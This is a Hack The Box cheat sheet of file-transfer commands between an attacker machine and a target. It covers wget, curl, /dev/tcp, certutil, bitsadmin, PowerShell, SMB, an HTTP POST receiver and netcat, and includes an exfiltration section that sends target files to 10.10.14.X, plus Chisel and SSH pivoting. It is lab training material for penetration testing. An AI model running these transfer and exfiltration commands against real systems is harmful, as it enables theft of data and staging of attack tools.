# File Transfer Cheatsheet

Methods to transfer files between attacker and target machines in HTB.

## Attacker -> Target (Linux)

```bash
# Python HTTP server
python3 -m http.server 80

# On target - wget
wget http://10.10.14.X/file -O /tmp/file

# On target - curl
curl http://10.10.14.X/file -o /tmp/file

# On target - bash (no wget/curl)
cat < /dev/tcp/10.10.14.X/80 > /tmp/file

# Netcat
# Attacker:
nc -lvnp 4444 < file
# Target:
nc 10.10.14.X 4444 > file

# SCP
scp file user@10.10.10.X:/tmp/file

# Base64
# Attacker:
base64 -w0 file; echo
# Target:
echo "base64string" | base64 -d > file
```

## Attacker -> Target (Windows)

```powershell
# PowerShell download
Invoke-WebRequest -Uri http://10.10.14.X/file -OutFile C:\temp\file
(New-Object Net.WebClient).DownloadFile('http://10.10.14.X/file','C:\temp\file')
iwr http://10.10.14.X/file -o C:\temp\file

# Certutil
certutil -urlcache -split -f http://10.10.14.X/file C:\temp\file

# Bitsadmin
bitsadmin /transfer job http://10.10.14.X/file C:\temp\file

# curl (Windows 10+)
curl http://10.10.14.X/file -o C:\temp\file

# SMB share
# Attacker:
impacket-smbserver share . -smb2support
# Target:
copy \\10.10.14.X\share\file C:\temp\file

# SMB with auth (for newer Windows)
# Attacker:
impacket-smbserver share . -smb2support -user test -password test
# Target:
net use \\10.10.14.X\share /user:test test
copy \\10.10.14.X\share\file C:\temp\file
```

## Target -> Attacker (Exfiltration)

```bash
# Netcat
# Attacker:
nc -lvnp 4444 > file
# Target:
nc 10.10.14.X 4444 < /path/to/file

# Base64 (copy-paste)
# Target:
base64 -w0 /path/to/file
# Attacker:
echo "base64string" | base64 -d > file

# HTTP POST
# Attacker:
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        with open('received_file', 'wb') as f:
            f.write(data)
        self.send_response(200)
        self.end_headers()
HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
"
# Target:
curl -X POST http://10.10.14.X -d @/path/to/file

# SCP (if you have SSH access)
scp user@10.10.10.X:/path/to/file ./file
```

## Pivoting File Transfers

```bash
# Through SSH tunnel
ssh -L 8888:internal_host:80 user@10.10.10.X
wget http://127.0.0.1:8888/file

# Through Chisel
# Attacker: chisel server -p 8080 --reverse
# Target: ./chisel client 10.10.14.X:8080 R:socks
# Then use proxychains

# Through Ligolo-ng
# Setup tunnel, then transfer directly to internal hosts
```
